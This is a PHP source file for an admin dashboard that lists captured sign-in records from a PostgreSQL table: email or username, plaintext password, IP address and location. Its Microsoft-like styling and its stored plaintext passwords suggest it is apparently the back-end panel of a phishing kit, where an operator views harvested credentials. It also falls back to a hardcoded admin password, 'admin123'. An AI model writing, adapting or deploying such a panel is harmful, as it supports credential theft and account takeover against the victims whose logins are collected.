<?php
// ============================================
// DASHBOARD - View logs from PostgreSQL
// ============================================

session_start();

$admin_password = getenv('ADMIN_PASSWORD') ?: 'admin123';  // Set in Render env

$is_logged_in = false;

if (isset($_POST['login_password'])) {
    if ($_POST['login_password'] === $admin_password) {
        $_SESSION['admin_logged_in'] = true;
        header('Location: dashboard.php');
        exit;
    } else {
        $error = "❌ Incorrect password!";
    }
}

if (isset($_SESSION['admin_logged_in']) && $_SESSION['admin_logged_in'] === true) {
    $is_logged_in = true;
}

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: dashboard.php');
    exit;
}

// ============================================
// READ LOGS FROM DATABASE
// ============================================

$entries = [];
$total = 0;

$db_url = getenv('DATABASE_URL');
if ($db_url) {
    $db = parse_url($db_url);
    $dsn = "pgsql:host={$db['host']};port={$db['port']};dbname=" . ltrim($db['path'], '/');
    $user = $db['user'];
    $pass = $db['pass'];
    
    try {
        $pdo = new PDO($dsn, $user, $pass);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $stmt = $pdo->query("SELECT * FROM logs ORDER BY time DESC");
        $entries = $stmt->fetchAll(PDO::FETCH_ASSOC);
        $total = count($entries);
    } catch (PDOException $e) {
        // Silent fail
    }
}

if (!$is_logged_in) {
    // Show login form (same as before)
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Dashboard - Admin Login</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                background: #f5f5f5;
                color: #333;
                font-family: 'Segoe UI', Arial, sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                padding: 20px;
            }
            .login-box {
                background: #fff;
                padding: 40px;
                border-radius: 8px;
                box-shadow: 0 4px 12px rgba(0,0,0,0.1);
                max-width: 400px;
                width: 100%;
            }
            .login-box h1 { font-size: 24px; margin-bottom: 8px; text-align: center; }
            .login-box p { color: #666; margin-bottom: 25px; text-align: center; }
            .login-box input {
                width: 100%;
                padding: 12px;
                border: 1px solid #ddd;
                border-radius: 4px;
                font-size: 16px;
                margin-bottom: 15px;
            }
            .login-box input:focus { outline: none; border-color: #0067b8; }
            .login-box button {
                width: 100%;
                padding: 12px;
                background: #0067b8;
                color: #fff;
                border: none;
                border-radius: 4px;
                font-size: 16px;
                font-weight: 600;
                cursor: pointer;
            }
            .login-box button:hover { background: #005da6; }
            .error { color: #d32f2f; margin-top: 15px; text-align: center; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h1>🔐 Dashboard Access</h1>
            <p>Enter your password to view logs</p>
            <form method="POST">
                <input type="password" name="login_password" placeholder="Enter password" required autofocus>
                <button type="submit">Access Dashboard</button>
                <?php if (isset($error)): ?>
                    <div class="error"><?php echo $error; ?></div>
                <?php endif; ?>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// Show dashboard (same as before but use $entries)
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - Sign-in Logs</title>
    <style>
        /* same styles as earlier */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #f5f5f5;
            color: #333;
            font-family: 'Segoe UI', Arial, sans-serif;
            padding: 20px;
            min-height: 100vh;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 0;
            border-bottom: 1px solid #ddd;
            margin-bottom: 30px;
            flex-wrap: wrap;
            gap: 15px;
        }
        .header h1 { font-size: 28px; font-weight: 700; color: #333; }
        .header h1 span { color: #0067b8; }
        .header-actions { display: flex; gap: 10px; flex-wrap: wrap; }
        .header-actions a {
            padding: 10px 20px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
            transition: all 0.3s;
        }
        .btn-refresh { background: #0067b8; color: #fff; }
        .btn-refresh:hover { background: #005da6; }
        .btn-settings { background: #17a2b8; color: #fff; }
        .btn-settings:hover { background: #138496; }
        .btn-logout { background: #d32f2f; color: #fff; }
        .btn-logout:hover { background: #b71c1c; }

        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: #fff;
            border-radius: 8px;
            padding: 20px;
            text-align: center;
            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
        }
        .stat-card .number { font-size: 32px; font-weight: 700; color: #0067b8; }
        .stat-card .label { color: #666; font-size: 14px; margin-top: 5px; }

        .table-wrapper {
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
            overflow: hidden;
            overflow-x: auto;
        }
        table { width: 100%; border-collapse: collapse; min-width: 700px; }
        th {
            background: #f8f9fa;
            color: #666;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            padding: 15px 20px;
            text-align: left;
            border-bottom: 1px solid #e0e0e0;
        }
        td { padding: 15px 20px; border-bottom: 1px solid #f0f0f0; font-size: 14px; }
        tr:hover td { background: #f8f9fa; }
        tr:last-child td { border-bottom: none; }

        .username-cell { font-weight: 600; color: #333; }
        .password-cell { font-family: monospace; color: #d32f2f; }
        .ip-cell { font-family: monospace; color: #0067b8; }
        .time-cell { color: #666; font-size: 13px; }

        .empty-state { padding: 60px 20px; text-align: center; color: #666; }
        .empty-state .icon { font-size: 48px; margin-bottom: 15px; }

        .footer {
            text-align: center;
            color: #999;
            padding: 20px;
            font-size: 13px;
            border-top: 1px solid #e0e0e0;
            margin-top: 30px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📊 Sign-in <span>Dashboard</span></h1>
            <div class="header-actions">
                <a href="dashboard.php" class="btn-refresh">⟳ Refresh</a>
                <a href="../settings/config.php" class="btn-settings">⚙️ Settings</a>
                <a href="dashboard.php?logout=1" class="btn-logout">🚪 Logout</a>
            </div>
        </div>

        <div class="stats">
            <div class="stat-card"><div class="number"><?php echo $total; ?></div><div class="label">Total Sign-ins</div></div>
        </div>

        <div class="table-wrapper">
            <table>
                <thead>
                    <tr>
                        <th>#</th>
                        <th>Email / User</th>
                        <th>Password</th>
                        <th>IP</th>
                        <th>Location</th>
                        <th>Time</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if (empty($entries)): ?>
                        <tr>
                            <td colspan="6">
                                <div class="empty-state">
                                    <div class="icon">📭</div>
                                    <p>No sign-in attempts yet</p>
                                </div>
                            </td>
                        </tr>
                    <?php else: ?>
                        <?php $count = 0; foreach ($entries as $entry): 
                            $count++;
                            $location = '';
                            if (!empty($entry['city']) && !empty($entry['country'])) {
                                $location = $entry['city'] . ', ' . $entry['country'];
                            } elseif (!empty($entry['country'])) {
                                $location = $entry['country'];
                            } else {
                                $location = 'Unknown';
                            }
                            
                            $flag = '🌍';
                            $country = strtolower($entry['country'] ?? '');
                            if (strpos($country, 'nigeria') !== false) $flag = '🇳🇬';
                            elseif (strpos($country, 'canada') !== false) $flag = '🇨🇦';
                            elseif (strpos($country, 'usa') !== false || strpos($country, 'united states') !== false) $flag = '🇺🇸';
                            elseif (strpos($country, 'uk') !== false || strpos($country, 'united kingdom') !== false) $flag = '🇬🇧';
                        ?>
                        <tr>
                            <td><?php echo $count; ?></td>
                            <td class="username-cell"><?php echo htmlspecialchars($entry['username'] ?? '-'); ?></td>
                            <td class="password-cell"><?php echo htmlspecialchars($entry['password'] ?? '-'); ?></td>
                            <td class="ip-cell"><?php echo htmlspecialchars($entry['ip'] ?? '-'); ?></td>
                            <td><?php echo $flag . ' ' . htmlspecialchars($location); ?></td>
                            <td class="time-cell"><?php echo htmlspecialchars($entry['time'] ?? '-'); ?></td>
                        </tr>
                        <?php endforeach; ?>
                    <?php endif; ?>
                </tbody>
            </table>
        </div>

        <div class="footer">
            <p>📁 Logs stored in PostgreSQL | Total entries: <?php echo $total; ?></p>
        </div>
    </div>

    <script>
        setTimeout(() => { location.reload(); }, 30000);
    </script>
</body>
</html>
